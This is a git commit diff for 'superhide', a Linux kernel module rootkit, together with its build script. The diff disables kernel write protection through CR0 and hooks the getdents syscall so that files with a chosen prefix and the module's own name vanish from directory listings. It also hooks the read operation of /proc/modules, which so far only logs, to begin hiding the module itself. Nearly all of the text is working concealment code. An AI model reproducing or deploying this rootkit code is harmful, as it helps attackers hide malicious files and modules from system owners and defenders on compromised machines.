17dab7a0970d7170a0eb95ff8235473d50d96117
Jordan Whitehead <jordan9001@gmail.com>
2017-11-30 11:10:34 -0500

    going to hide from /proc/modules for fun

--- prepare_before_make.sh
+++ prepare_before_make.sh
@@ -4,9 +4,14 @@
 
 smap="/boot/System.map-$(uname -r)"
 
+echo -e "#pragma once" > ./sysgen.h
+echo -e "#include <linux/fs.h>" >> ./sysgen.h
+
 symbline=$(cat $smap | grep '\Wsys_call_table$')
 set $symbline
-
-echo -e "#pragma once" > ./sysgen.h
 echo -e "void** sys_call_table = (void**)0x$1;" >> ./sysgen.h
 
+procline=$(cat $smap | grep '\Wproc_modules_operations$')
+set $procline
+
+echo -e "struct file_operations* proc_modules_operations = (struct file_operations*)0x$1;" >> ./sysgen.h
--- superhide.c
+++ superhide.c
@@ -3,12 +3,15 @@
 #include <linux/kallsyms.h>
 #include <asm/special_insns.h>
 #include <linux/string.h>
+#include <linux/fs.h>
 #include "sysgen.h"
 
 #define GETDENTS_SYSCALL_NUM	78
 #define WRITE_PROTECT_FLAG	(1<<16)
 #define HIDE_PREFIX		"sshrpa."
 #define HIDE_PREFIX_SZ		(sizeof(HIDE_PREFIX) - 1)
+#define MODULE_NAME		"superhide"
+#define MODULE_NAME_SZ		(sizeof(MODULE_NAME) - 1)
 
 struct linux_dirent {
 	unsigned long	d_ino;
@@ -20,7 +23,10 @@ struct linux_dirent {
 MODULE_LICENSE("GPL"); // Is actually needed on some distros inorder to link with things
 
 typedef asmlinkage long (*sys_getdents_t)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
-sys_getdents_t sys_getdents_orig;
+sys_getdents_t sys_getdents_orig = NULL;
+
+typedef ssize_t (*proc_modules_read_t) (struct file *, char __user *, size_t, loff_t *); 
+proc_modules_read_t proc_modules_read_orig = NULL;
 
 
 unsigned long (*arch_syscall_addr)(int nr) = NULL;
@@ -37,7 +43,8 @@ asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent __user *di
 	// go through the return and check it out
 	for (boff = 0; boff < ret;) {
 		ent = (struct linux_dirent*)(dbuf + boff);
-		if (strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0) {
+		if ((strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0)
+			|| (strncmp(ent->d_name, MODULE_NAME, MODULE_NAME_SZ) == 0)) {
 			// copy forward the rest
 			memcpy(dbuf + boff, dbuf + boff + ent->d_reclen, ret - (boff + ent->d_reclen));
 			ret -= ent->d_reclen;
@@ -47,34 +54,46 @@ asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent __user *di
 	return ret;
 }
 
+ssize_t proc_modules_read_new(struct file *f, char __user *buf, size_t len, loff_t *offset) {
+	printk(KERN_INFO "New proc read called\n");
+	return proc_modules_read_orig(f, buf, len, offset);
+}
+
 static int __init lkm_init_module(void) {
-	printk(KERN_INFO "lickem loaded\n");
+	printk(KERN_INFO "superhide loaded\n");
 
 	printk(KERN_INFO "sys_call_table @ %p\n", sys_call_table);
 	
 	sys_getdents_orig = (sys_getdents_t)((void**)sys_call_table)[GETDENTS_SYSCALL_NUM];
 	
 	printk(KERN_INFO "original sys_getdents @ %p\n", sys_getdents_orig);
+
+	proc_modules_read_orig = proc_modules_operations->read;
+	printk(KERN_INFO "original proc/modules read @ %p\n", proc_modules_read_orig);
 	
-	printk(KERN_INFO "cr0 before write enabled%016lx\n", read_cr0());
 	write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
-	printk(KERN_INFO "cr0 during write enabled%016lx\n", read_cr0());
 	
 	sys_call_table[GETDENTS_SYSCALL_NUM] = sys_getdents_new;
+	proc_modules_operations->read = proc_modules_read_new;
 
-	printk(KERN_INFO "cr0 after write enabled%016lx\n", read_cr0());
 	write_cr0(read_cr0() | WRITE_PROTECT_FLAG);
 
-	printk(KERN_INFO "New one in place!\n");
+	printk(KERN_INFO "New syscall in place\n");
+	printk(KERN_INFO "New proc/modules read in place\n");
+
+	
+
 	return 0;
 }
 
 static void __exit lkm_cleanup_module(void) {
-	printk(KERN_INFO "lickem leaving\n");
+	printk(KERN_INFO "superhide leaving\n");
 	write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
 	sys_call_table[GETDENTS_SYSCALL_NUM] = sys_getdents_orig;
+	proc_modules_operations->read = proc_modules_read_orig;
 	write_cr0(read_cr0() | WRITE_PROTECT_FLAG);
-	printk(KERN_INFO "Old one back!\n");
+	printk(KERN_INFO "Old syscall back\n");
+	printk(KERN_INFO "Old proc/modules read back\n");
 }
 
 module_init(lkm_init_module);
